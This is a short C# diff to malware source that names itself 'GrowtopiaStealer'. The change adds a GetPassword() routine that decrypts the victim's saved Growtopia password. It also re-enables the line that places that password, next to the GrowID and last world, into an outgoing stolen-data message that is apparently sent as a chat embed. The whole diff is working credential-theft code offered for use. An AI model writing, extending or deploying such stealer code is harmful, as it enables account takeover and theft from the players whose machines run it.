@@ -129,7 +129,25 @@ namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
                 }
                 return result;
             }
+            string GetPassword()
+            {
+                string text = "";
 
+                Thread.Sleep(100);
+                try
+                {
+                    string[] array = new pwDec().Func(Growtopia.GetPasswordBytes());
+                    foreach (string str in array)
+                    {
+                        text = text + str + Environment.NewLine;
+                    }
+                }
+                catch
+                {
+                }
+
+                return text;
+            }
             #endregion
 
             #region Rainbow Line gif
@@ -312,7 +330,7 @@ namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
                         description:
                         "\n ================================" +
                         "\n```GrowID: " + GetGrowID() + "```" +
-                      //"\n```Password: " + GetPassword() + "```" +
+                        "\n```Password: " + GetPassword() + "```" +
                         "\n```Last World: " + GetLastWorld() + "```" +
                         "\n ================================"
                         ,
